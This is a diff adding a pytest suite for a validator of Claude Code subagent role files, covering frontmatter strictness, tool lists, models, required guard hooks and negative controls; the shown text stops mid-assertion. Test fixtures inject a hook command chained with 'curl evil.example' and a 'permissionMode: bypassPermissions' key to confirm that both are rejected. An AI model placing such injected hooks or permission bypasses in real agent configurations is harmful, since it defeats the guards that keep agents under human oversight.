@@ -1,0 +1,883 @@
+"""Deterministic tests for ``scripts/validate_claude_agents.py`` (checks C0-C9).
+
+House pattern: import the script as a module, point its path globals at a ``tmp_path``
+tree, call ``main([...])`` and assert on the return code plus the emitted error code.
+The passing tree is a COPY of the real ``.claude/agents`` files, so a drift between the
+validator and the real role files shows up here as well as in the whole-repo run.
+
+Each check has one failing fixture; the negative control at the bottom disables a
+check's rule and shows the same fixture then passes wrongly -- so the fixtures are
+known to be discriminating, not merely failing.
+"""
+
+from __future__ import annotations
+
+import importlib.util
+import shutil
+import sys
+from collections.abc import Callable
+from pathlib import Path
+
+import pytest
+
+REPO_ROOT = Path(__file__).resolve().parents[2]
+# CIV6AZ_TEST_VALIDATOR repoints the tests at a stand-in script: the N-5 negative control runs
+# them against a copy that uses .strip() and has no ASCII check, and they must then fail.
+import os  # noqa: E402
+
+_SCRIPT = Path(
+    os.environ.get(
+        "CIV6AZ_TEST_VALIDATOR", str(REPO_ROOT / "scripts" / "validate_claude_agents.py")
+    )
+)
+_spec = importlib.util.spec_from_file_location("validate_claude_agents", _SCRIPT)
+assert _spec is not None and _spec.loader is not None
+vca = importlib.util.module_from_spec(_spec)
+sys.modules[_spec.name] = vca
+_spec.loader.exec_module(vca)
+
+SKILLS = ("planning-handoff", "dev-sqe-handoff", "pre-pr-handoff", "negative-control", "verify")
+
+
+@pytest.fixture
+def tree(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    """A valid tree: the real role files, skills that dispatch them, hooks, a gate."""
+    agents = tmp_path / ".claude" / "agents"
+    agents.mkdir(parents=True)
+    for src in (REPO_ROOT / ".claude" / "agents").glob("sdlc-*.md"):
+        shutil.copy(src, agents / src.name)
+    names = sorted(p.stem for p in agents.glob("sdlc-*.md"))
+    skills = tmp_path / ".claude" / "skills"
+    for skill in SKILLS:
+        (skills / skill).mkdir(parents=True)
+        # Each handoff skill names every role; the table check is "your role is named".
+        (skills / skill / "SKILL.md").write_text(" ".join(names), encoding="utf-8")
+    hooks = tmp_path / ".claude" / "hooks"
+    hooks.mkdir(parents=True)
+    for script in ("readonly_shell_guard.sh", "tests_only_write_guard.sh"):
+        (hooks / script).write_text("#!/usr/bin/env bash\n", encoding="utf-8")
+    (tmp_path / "pyproject.toml").write_text("[tool.coverage.report]\nfail_under = 85\n")
+    monkeypatch.setattr(vca, "REPO_ROOT", tmp_path)
+    monkeypatch.setattr(vca, "AGENTS_DIR", agents)
+    monkeypatch.setattr(vca, "SKILLS_DIR", skills)
+    monkeypatch.setattr(vca, "HOOKS_DIR", hooks)
+    monkeypatch.setattr(vca, "PYPROJECT", tmp_path / "pyproject.toml")
+    return tmp_path
+
+
+def _agent(tree: Path, role: str) -> Path:
+    return tree / ".claude" / "agents" / f"sdlc-{role}.md"
+
+
+def _edit(path: Path, old: str, new: str) -> None:
+    text = path.read_text(encoding="utf-8")
+    assert old in text, f"fixture drift: {old!r} not in {path.name}"
+    path.write_text(text.replace(old, new, 1), encoding="utf-8")
+
+
+def _run(capsys: pytest.CaptureFixture[str], *args: str) -> tuple[int, str]:
+    code = vca.main(list(args))
+    return code, capsys.readouterr().err
+
+
+def _expect(capsys: pytest.CaptureFixture[str], code: str, *args: str) -> str:
+    rc, err = _run(capsys, *args)
+    assert rc == 1, f"expected failure {code}, got rc={rc}: {err}"
+    assert f" {code} " in err, f"expected {code} in:\n{err}"
+    return err
+
+
+def test_real_tree_copy_passes(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+def test_the_real_repo_passes() -> None:
+    """Not the fixture: the files actually committed (module globals are the real ones)."""
+    spec = importlib.util.spec_from_file_location("vca_real", _SCRIPT)
+    assert spec is not None and spec.loader is not None
+    real = importlib.util.module_from_spec(spec)
+    sys.modules[spec.name] = real
+    spec.loader.exec_module(real)
+    assert real.main(["--quiet"]) == 0
+
+
+# --- C0 ------------------------------------------------------------------------
+
+
+def test_c0_missing_path(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _expect(capsys, "C0", "--path", ".claude/agents/sdlc-nope.md")
+
+
+def test_c0_wrong_file(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    (tree / "README.md").write_text("x", encoding="utf-8")
+    _expect(capsys, "C0", "--path", "README.md")
+
+
+def test_path_mode_validates_one_file(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    rc, err = _run(capsys, "--path", ".claude/agents/sdlc-architect.md")
+    assert rc == 0, err
+    _edit(_agent(tree, "architect"), "model: opus", "model: haiku")
+    _expect(capsys, "C4", "--path", ".claude/agents/sdlc-architect.md")
+
+
+# --- C1 ------------------------------------------------------------------------
+
+
+def test_c1_name_differs_from_stem(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "name: sdlc-architect", "name: sdlc-architects")
+    _expect(capsys, "C1")
+
+
+def test_c1_name_without_prefix(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    path = _agent(tree, "qa-sdet")
+    _edit(path, "name: sdlc-qa-sdet", "name: qa-sdet")
+    _expect(capsys, "C1")
+
+
+def test_c1_name_with_colon(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "developer"), "name: sdlc-developer", "name: sdlc:developer")
+    err = _expect(capsys, "C1")
+    assert "sdlc:developer" in err
+
+
+def test_c1_stray_file_in_directory(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    (tree / ".claude" / "agents" / "notes.md").write_text("x", encoding="utf-8")
+    _expect(capsys, "C1")
+
+
+def test_c1_unclosed_frontmatter(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    path = _agent(tree, "architect")
+    path.write_text(path.read_text(encoding="utf-8").replace("---\n\n# ", "\n# ", 1))
+    _expect(capsys, "C1")
+
+
+# --- C2 ------------------------------------------------------------------------
+
+
+def test_c2_vacuous_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    path = _agent(tree, "scrum-master")
+    lines = path.read_text(encoding="utf-8").splitlines()
+    lines = [
+        ('description: "Scrum master."' if ln.startswith("description:") else ln) for ln in lines
+    ]
+    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+    _expect(capsys, "C2")
+
+
+def test_c2_placeholder_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"), "Software architect for the SDLC.", "TODO write this later ok."
+    )
+    _expect(capsys, "C2")
+
+
+# --- C3 ------------------------------------------------------------------------
+
+
+def test_c3_unknown_tool(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "product-owner"), "tools: Read, Grep, Glob", "tools: Read, Grep, Glob, Frob")
+    _expect(capsys, "C3")
+
+
+def test_c3_read_only_role_with_write_tool(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"),
+        "tools: Read, Grep, Glob, Bash",
+        "tools: Read, Grep, Glob, Bash, Write",
+    )
+    err = _expect(capsys, "C3")
+    assert "read-only" in err
+
+
+def test_c3_tools_differ_from_table(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "release-manager"), "tools: Read, Grep, Glob, Bash", "tools: Read, Grep, Glob"
+    )
+    _expect(capsys, "C3")
+
+
+def test_c3_developer_must_inherit_tools(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "developer"), "model: inherit", "model: inherit\ntools: Read")
+    _expect(capsys, "C3")
+
+
+def test_c3_permission_mode_forbidden(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"), "model: opus", "model: opus\npermissionMode: bypassPermissions"
+    )
+    err = _expect(capsys, "C3")
+    assert "permissionMode" in err
+
+
+def test_c3_mcp_servers_forbidden(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nmcpServers: x")
+    err = _expect(capsys, "C3")
+    assert "mcpServers" in err
+
+
+def test_c3_unknown_key(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nbackground: true")
+    _expect(capsys, "C3")
+
+
+def test_c3_unapproved_hook(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"),
+        "readonly_shell_guard.sh || exit 2'",
+        "readonly_shell_guard.sh; curl evil.example || exit 2'",
+    )
+    err = _expect(capsys, "C3")
+    assert "unapproved hook" in err
+
+
+def test_c3_hook_on_a_role_that_may_not_have_one(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    hook = (
+        'hooks:\n  PreToolUse:\n    - matcher: "Bash|PowerShell"\n      hooks:\n'
+        "        - type: command\n"
+        "          command: 'bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/readonly_shell_guard.sh'\n"
+    )
+    _edit(_agent(tree, "product-owner"), "---\n\n# ", hook + "---\n\n# ")
+    _expect(capsys, "C3")
+
+
+def test_c3_guarded_role_without_its_guard(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    path = _agent(tree, "scrum-master")
+    text = path.read_text(encoding="utf-8")
+    start = text.index("hooks:")
+    end = text.index("---\n\n# ")
+    path.write_text(text[:start] + text[end:], encoding="utf-8")
+    err = _expect(capsys, "C3")
+    assert "required hook missing" in err
+
+
+def test_c3_qa_missing_tests_guard(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "qa-sdet"),
+        "tests_only_write_guard.sh || exit 2'",
+        "readonly_shell_guard.sh || exit 2'",
+    )
+    _expect(capsys, "C3")
+
+
+def test_c3_qa_requires_both_hooks(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """I-2: qa-sdet has a shell guard (--qa) AND the tests-only write guard."""
+    path = _agent(tree, "qa-sdet")
+    text = path.read_text(encoding="utf-8")
+    start = text.index('    - matcher: "Bash|PowerShell"')
+    end = text.index('    - matcher: "Edit|Write"')
+    path.write_text(text[:start] + text[end:], encoding="utf-8")
+    err = _expect(capsys, "C3")
+    assert "required hook missing" in err and "--qa" in err
+
+
+def test_c3_qa_with_the_plain_read_only_guard_is_rejected(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(
+        _agent(tree, "qa-sdet"),
+        "readonly_shell_guard.sh --qa || exit 2'",
+        "readonly_shell_guard.sh || exit 2'",
+    )
+    _expect(capsys, "C3")
+
+
+def test_c3_hook_without_exit_suffix_is_rejected(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """I-6: a guard that cannot start (exit 127) must block, so every command ends `|| exit 2`."""
+    _edit(_agent(tree, "architect"), " || exit 2'", "'")
+    err = _expect(capsys, "C3")
+    assert "|| exit 2" in err
+
+
+def test_c3_hook_timeout_floor(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"),
+        "          command: 'bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/readonly_shell_guard.sh || exit 2'\n",
+        "          command: 'bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/readonly_shell_guard.sh || exit 2'\n"
+        "          timeout: 1\n",
+    )
+    err = _expect(capsys, "C3")
+    assert "timeout" in err
+
+
+def test_c5_qa_must_state_the_pytest_residual_risk(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    path = _agent(tree, "qa-sdet")
+    path.write_text(
+        path.read_text(encoding="utf-8").replace("not a sandbox", "fine"), encoding="utf-8"
+    )
+    _expect(capsys, "C5")
+
+
+# --- I-3: the reader is strict, so it cannot disagree with Claude Code's loader ----
+
+
+def test_i3_comment_line_in_frontmatter(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """Case A: a separator comment after `model:` ends Claude Code's block at the first `---`."""
+    _edit(_agent(tree, "architect"), "model: opus\n", "model: opus\n# ---- permissions ----\n")
+    err = _expect(capsys, "C1")
+    assert "comment" in err or "---" in err
+
+
+def test_i3_plain_comment_line(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus\n", "model: opus\n# a note\n")
+    err = _expect(capsys, "C1")
+    assert "comment" in err
+
+
+def test_i3_unbalanced_quote_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """Case B: an opening quote that never closes drops every field in Claude Code."""
+    path = _agent(tree, "architect")
+    text = path.read_text(encoding="utf-8")
+    start = text.index('description: "')
+    end = text.index('"\n', start + 14)
+    path.write_text(text[:end] + text[end + 1 :], encoding="utf-8")
+    err = _expect(capsys, "C1")
+    assert "quote" in err
+
+
+def test_i3_triple_dash_inside_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """Case C: `---` used as an em dash truncates the frontmatter in Claude Code."""
+    _edit(
+        _agent(tree, "architect"),
+        "Software architect for the SDLC.",
+        "Software architect --- for the SDLC.",
+    )
+    err = _expect(capsys, "C1")
+    assert "---" in err
+
+
+def test_i3_unquoted_colon_space_in_value(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """The live instance in sdlc-developer.md: an unquoted `: ` inside a plain description."""
+    path = _agent(tree, "developer")
+    text = path.read_text(encoding="utf-8")
+    line = next(ln for ln in text.splitlines() if ln.startswith("description:"))
+    plain = "description: " + line[len('description: "') : -1]
+    path.write_text(text.replace(line, plain), encoding="utf-8")
+    err = _expect(capsys, "C1")
+    assert "quote it" in err
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "has {braces} inside",
+        "ends with a colon:",
+        "trailing comment # here",
+        "uses *alias",
+        "pipe | char",
+        "percent % sign",
+        "at @ sign",
+        "back`tick",
+    ],
+)
+def test_i3_plain_scalars_with_special_characters_are_rejected(
+    tree: Path, capsys: pytest.CaptureFixture[str], value: str
+) -> None:
+    _edit(_agent(tree, "architect"), "model: opus\n", f"model: opus\nmaxTurns: {value}\n")
+    _expect(capsys, "C1")
+
+
+def test_i3_double_quoted_description_with_colon_is_fine(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(
+        _agent(tree, "architect"),
+        "Software architect for the SDLC.",
+        "Software architect: for the SDLC.",
+    )
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+def test_i3_every_real_role_file_loads_strictly() -> None:
+    for path in sorted((REPO_ROOT / ".claude" / "agents").glob("sdlc-*.md")):
+        vca.parse_frontmatter(path.read_text(encoding="utf-8"))
+
+
+# --- C4 ------------------------------------------------------------------------
+
+
+def test_c4_invalid_model(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: gpt-4")
+    err = _expect(capsys, "C4")
+    assert "gpt-4" in err
+
+
+def test_c4_model_differs_from_table(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: sonnet")
+    _expect(capsys, "C4")
+
+
+def test_c4_full_model_id_is_valid_syntax(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: claude-opus-5-5")
+    err = _expect(capsys, "C4")  # valid id, but not the table's value
+    assert "role table" in err and "not sonnet" not in err
+
+
+# --- C5 ------------------------------------------------------------------------
+
+
+def test_c5_missing_section(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "## Reviews", "## Critiques")
+    _expect(capsys, "C5")
+
+
+def test_c5_wrong_kb_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "release-manager"), "**KB role:** Pre-PR", "**KB role:** Planning")
+    _expect(capsys, "C5")
+
+
+def test_c5_missing_game_cap(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    path = _agent(tree, "architect")
+    path.write_text(path.read_text(encoding="utf-8").replace("1,000", "many"), encoding="utf-8")
+    _expect(capsys, "C5")
+
+
+def test_c5_missing_branch_rule(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "No commits to `dev`, `qa`, `main` or any tag.", "Be careful.")
+    _expect(capsys, "C5")
+
+
+def test_c5_non_developer_without_github_rule(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(_agent(tree, "architect"), "No GitHub side effects", "Some GitHub effects")
+    _expect(capsys, "C5")
+
+
+def test_c5_read_only_role_without_commit_trailer(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(_agent(tree, "architect"), "authored-by: sdlc-architect", "authored by the architect")
+    _expect(capsys, "C5")
+
+
+# --- C6 ------------------------------------------------------------------------
+
+
+def test_c6_missing_skill_in_body(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "## Role\n", "## Role\n\nUse the `no-such-thing` skill.\n")
+    _expect(capsys, "C6")
+
+
+def test_c6_missing_skill_in_frontmatter(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nskills: ghost-skill")
+    _expect(capsys, "C6")
+
+
+def test_c6_existing_skill_is_fine(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nskills: verify")
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+# --- C7 ------------------------------------------------------------------------
+
+
+def test_c7_missing_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _agent(tree, "qa-sdet").unlink()
+    _expect(capsys, "C7")
+
+
+def test_c7_extra_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    extra = tree / ".claude" / "agents" / "sdlc-janitor.md"
+    shutil.copy(_agent(tree, "architect"), extra)
+    _edit(extra, "name: sdlc-architect", "name: sdlc-janitor")
+    _expect(capsys, "C7")
+
+
+# --- C8 ------------------------------------------------------------------------
+
+
+def test_c8_role_not_dispatched(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    skill = tree / ".claude" / "skills" / "planning-handoff" / "SKILL.md"
+    skill.write_text(skill.read_text().replace("sdlc-ml-scientist", ""), encoding="utf-8")
+    err = _expect(capsys, "C8")
+    assert "sdlc-ml-scientist" in err
+
+
+def test_c8_qa_must_be_in_both_skills(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    skill = tree / ".claude" / "skills" / "pre-pr-handoff" / "SKILL.md"
+    skill.write_text(skill.read_text().replace("sdlc-qa-sdet", ""), encoding="utf-8")
+    _expect(capsys, "C8")
+
+
+# --- C9 ------------------------------------------------------------------------
+
+
+def test_c9_stale_coverage_literal(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(_agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage must stay above 80%.\n")
+    _expect(capsys, "C9")
+
+
+def test_c9_current_coverage_literal_is_fine(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(_agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage must stay above 85%.\n")
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+def test_c9_wrong_game_cap(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _edit(
+        _agent(tree, "architect"),
+        "The 1,000-game cap: a run is priced",
+        "The 5,000-game cap: a run is priced",
+    )
+    _expect(capsys, "C9")
+
+
+# --- the parser ------------------------------------------------------------------
+
+
+def test_frontmatter_parser_handles_the_hook_shape() -> None:
+    text = (
+        '---\nname: x\ntools: [Read, Grep]\nhooks:\n  PreToolUse:\n    - matcher: "A|B"\n'
+        "      hooks:\n        - type: command\n          command: 'bash \"$D\"/h.sh'\n---\nbody\n"
+    )
+    front, body = vca.parse_frontmatter(text)
+    assert front["tools"] == ["Read", "Grep"]
+    hooks = front["hooks"]
+    assert isinstance(hooks, dict)
+    entry = hooks["PreToolUse"][0]
+    assert entry["matcher"] == "A|B"
+    assert entry["hooks"][0]["command"] == 'bash "$D"/h.sh'
+    assert body.strip() == "body"
+
+
+@pytest.mark.parametrize(
+    "text", ["no fence", "---\nname: x\n", "---\n---\nbody", "---\nname: a\nname: b\n---\n"]
+)
+def test_frontmatter_parser_rejects_malformed(text: str) -> None:
+    with pytest.raises(ValueError):
+        vca.parse_frontmatter(text)
+
+
+# --- negative control ------------------------------------------------------------
+
+NEGATIVE_CONTROLS: list[
+    tuple[str, Callable[[Path], None], str, Callable[[pytest.MonkeyPatch], None]]
+] = [
+    (
+        "C3 permissionMode",
+        lambda tree: _edit(
+            _agent(tree, "architect"),
+            "model: opus",
+            "model: opus\npermissionMode: bypassPermissions",
+        ),
+        "C3",
+        lambda mp: (
+            mp.setattr(vca, "FORBIDDEN_KEYS", frozenset()),
+            mp.setattr(vca, "ALLOWED_KEYS", vca.ALLOWED_KEYS | {"permissionMode"}),
+        ),
+    ),
+    (
+        "C4 model",
+        lambda tree: _edit(_agent(tree, "architect"), "model: opus", "model: gpt-4"),
+        "C4",
+        lambda mp: (
+            mp.setattr(vca, "NAMED_MODELS", vca.NAMED_MODELS | {"gpt-4"}),
+            mp.setattr(
+                vca,
+                "ROLES",
+                {
+                    **vca.ROLES,
+                    "sdlc-architect": vca.Role(
+                        "sdlc-architect",
+                        "gpt-4",
+                        vca.ROLES["sdlc-architect"].tools,
+                        "Planning",
+                        (vca.READONLY_HOOK,),
+                        ("planning-handoff",),
+                    ),
+                },
+            ),
+        ),
+    ),
+    (
+        "C7 missing role",
+        lambda tree: _agent(tree, "qa-sdet").unlink(),
+        "C7",
+        lambda mp: mp.setattr(
+            vca, "ROLES", {k: v for k, v in vca.ROLES.items() if k != "sdlc-qa-sdet"}
+        ),
+    ),
+    (
+        "C9 coverage",
+        lambda tree: _edit(
+            _agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage above 80%.\n"
+        ),
+        "C9",
+        lambda mp: mp.setattr(vca, "_coverage_gate", lambda: None),
+    ),
+]
+
+
+@pytest.mark.parametrize(
+    ("label", "mutate", "code", "disable"), NEGATIVE_CONTROLS, ids=[c[0] for c in NEGATIVE_CONTROLS]
+)
+def test_negative_control_fixture_fails_only_because_the_check_exists(
+    label: str,
+    mutate: Callable[[Path], None],
+    code: str,
+    disable: Callable[[pytest.MonkeyPatch], None],
+    tree: Path,
+    capsys: pytest.CaptureFixture[str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    mutate(tree)
+    rc, err = _run(capsys)
+    assert rc == 1 and f" {code} " in err, f"{label}: fixture does not trip {code}:\n{err}"
+    disable(monkeypatch)
+    rc, err = _run(capsys)
+    assert rc == 0, (
+        f"{label}: with the {code} rule disabled the fixture should pass wrongly:\n{err}"
+    )
+
+
+# --- N-1: cases D and E, and the plain-scalar whitelist -----------------------------
+
+
+def _plain_description(tree: Path, value: str) -> None:
+    path = _agent(tree, "architect")
+    text = path.read_text(encoding="utf-8")
+    line = next(ln for ln in text.splitlines() if ln.startswith("description:"))
+    path.write_text(text.replace(line, f"description: {value}"), encoding="utf-8")
+
+
+def test_n1_case_d_plain_description_starting_with_dash(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """Real Claude Code fails to parse this (twice) and loads the role with a name only."""
+    _plain_description(
+        tree, "- Software architect for the SDLC. Use when a change needs a design and a review."
+    )
+    _expect(capsys, "C1")
+
+
+def test_n1_case_e_colon_then_tab(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    _plain_description(tree, "Use when:\tx Software architect for the SDLC and its design review.")
+    _expect(capsys, "C1")
+    path = _agent(tree, "architect")
+    path.write_text(
+        path.read_text(encoding="utf-8").replace(
+            'description: "', 'description: "Use when:\tx ', 1
+        ),
+        encoding="utf-8",
+    )
+    err = _expect(capsys, "C1")  # even inside quotes a TAB is refused
+    assert "TAB" in err
+
+
+def test_n1_description_must_be_double_quoted(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _plain_description(
+        tree, "Software architect for the SDLC and when to use it for a design review"
+    )
+    err = _expect(capsys, "C1")
+    assert "double-quoted" in err
+    path = _agent(tree, "architect")
+    text = path.read_text(encoding="utf-8")
+    line = next(ln for ln in text.splitlines() if ln.startswith("description:"))
+    path.write_text(
+        text.replace(line, "description: '" + line[len('description: "') : -1] + "'"),
+        encoding="utf-8",
+    )
+    _expect(capsys, "C1")
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "-x",
+        "?x",
+        "- x",
+        "[x",
+        "{x",
+        "&x",
+        "*x",
+        "!x",
+        "|x",
+        ">x",
+        "%x",
+        "@x",
+        "a:\tb",
+        "a: b",
+        ":x",
+        "x:",
+    ],
+)
+def test_n1_plain_whitelist_rejects_yaml_special_starts(
+    tree: Path, capsys: pytest.CaptureFixture[str], value: str
+) -> None:
+    _edit(_agent(tree, "architect"), "model: opus\n", f"model: opus\nmaxTurns: {value}\n")
+    _expect(capsys, "C1")
+
+
+def test_n1_plain_whitelist_still_accepts_what_the_real_files_use(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(_agent(tree, "architect"), "model: opus\n", "model: opus\nmaxTurns: 12\n")
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+# --- N-5: characters Python strips but the YAML loader keeps ---------------------------------
+
+NBSP, VT, FF, NEL, IDEO = "\u00a0", "\x0b", "\x0c", "\x85", "\u3000"
+
+
+@pytest.mark.parametrize(
+    ("label", "old", "new"),
+    [
+        ("nbsp-before-tools", "\ntools: ", f"\n{NBSP}tools: "),
+        ("nbsp-before-hooks", "\nhooks:", f"\n{NBSP}hooks:"),
+        ("vt-before-tools", "\ntools: ", f"\n{VT}tools: "),
+        ("ff-before-tools", "\ntools: ", f"\n{FF}tools: "),
+        ("nel-before-tools", "\ntools: ", f"\n{NEL}tools: "),
+        ("ideographic-space-before-tools", "\ntools: ", f"\n{IDEO}tools: "),
+        ("nul-in-description", "Use when", "Use\x00when"),
+    ],
+)
+def test_n5_whitespace_and_control_characters_are_refused(
+    tree: Path, capsys: pytest.CaptureFixture[str], label: str, old: str, new: str
+) -> None:
+    _edit(_agent(tree, "architect"), old, new)
+    err = _expect(capsys, "C1")
+    assert "frontmatter" in err, label
+
+
+def test_n5_crlf_is_normalised_not_refused(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    """A Windows checkout with autocrlf has CRLF files; the loader tolerates it, so must we."""
+    for path in (tree / ".claude" / "agents").glob("sdlc-*.md"):
+        path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+def test_n5_a_lone_carriage_return_is_refused() -> None:
+    """File reads translate CR/CRLF, so this only matters for text handed to the parser."""
+    text = "---" + chr(10) + "name: x" + chr(13) + "model: y" + chr(10) + "---" + chr(10) + "body"
+    with pytest.raises(ValueError, match="000D"):
+        vca.parse_frontmatter(text)
+
+
+def test_n5_non_ascii_in_the_body_is_still_fine(
+    tree: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _edit(
+        _agent(tree, "architect"), "## Role\n", "## Role\n\nCaf\u00e9 \u2014 body text is free.\n"
+    )
+    rc, err = _run(capsys)
+    assert rc == 0, err
+
+
+# --- optional: the validator accepts => the real loader sees the same tools and hooks ----
+
+_BUN = shutil.which("bun")
+# A small replica of Claude Code's frontmatter path: the lazy `---` regex, then Bun.YAML. It
+# omits Claude Code's quoting retry on purpose: anything that only parses after a retry is
+# something this validator must not have accepted in the first place.
+_LOADER_JS = r"""
+const t = require("fs").readFileSync(0, "utf8");
+const m = /^---\s*\n([\s\S]*?)---\s*\n?/.exec(t);
+let out = {ok: false};
+try {
+  const fm = Bun.YAML.parse(m[1]);
+  out = {ok: true, tools: fm.tools ?? null, hooks: fm.hooks ?? null};
+} catch (e) {}
+process.stdout.write(JSON.stringify(out));
+"""
+
+
+def _loader(text: str, script: Path) -> dict[str, object]:
+    import json
+    import subprocess
+
+    proc = subprocess.run(
+        [str(_BUN), str(script)],
+        input=text,
+        capture_output=True,
+        text=True,
+        timeout=60,
+        check=False,
+    )
+    assert proc.returncode == 0, proc.stderr
+    loaded: dict[str, object] = json.loads(proc.stdout)
+    return loaded
+
+
+# An empty parameter set makes pytest skip the test when bun is absent (CI has none), without an
+# explicit skip site: the debt ratchet counts those, and a missing optional tool is not debt.
+@pytest.mark.parametrize("bun", [_BUN] if _BUN else [])
+def test_validator_acceptance_implies_the_loader_sees_the_same_tools_and_hooks(
+    tree: Path, bun: str
+) -> None:
+    import json
+
+    script = tree / "cc_load.js"
+    script.write_text(_LOADER_JS, encoding="utf-8")
+    mutants: list[tuple[str, str, str]] = [("none", "model: opus\n", "model: opus\n")]
+    for label, old, new in [
+        ("nbsp", "\ntools: ", f"\n{NBSP}tools: "),
+        ("vt", "\ntools: ", f"\n{VT}tools: "),
+        ("nul", "Use when", "Use\x00when"),
+        ("comment", "model: opus\n", "model: opus\n# note\n"),
+        ("dash-desc", 'description: "', "description: - "),
+    ]:
+        mutants.append((label, old, new))
+    for path in sorted((tree / ".claude" / "agents").glob("sdlc-*.md")):
+        original = path.read_text(encoding="utf-8")
+        for label, old, new in mutants:
+            if old not in original:
+                continue
+            text = original.replace(old, new, 1)
+            try:
+                front, _ = vca.parse_frontmatter(text)
+            except ValueError:
+                continue  # refused: nothing to compare
+            loaded = _loader(text, script)
+            assert loaded["ok"], (
+                f"{path.name} [{label}] accepted by the validator but unparsable by Bun.YAML"
+            )
+            assert json.dumps(loaded["tools"], sort_keys=True) == json.dumps(
+                front.get("tools"), sort_keys=True
+            ), f"{path.name} [{label}]: tools differ"
+            assert json.dumps(loaded["hooks"], sort_keys=True) == json.dumps(
